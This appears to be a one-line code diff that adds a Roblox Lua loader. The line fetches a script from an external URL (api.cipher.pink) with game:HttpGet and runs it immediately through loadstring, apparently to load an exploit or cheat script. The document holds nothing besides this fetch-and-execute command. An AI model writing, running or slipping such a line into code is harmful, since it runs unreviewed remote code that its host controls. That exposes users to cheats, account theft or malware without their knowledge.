@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.cipher.pink/l/xrezt.lua", true))()
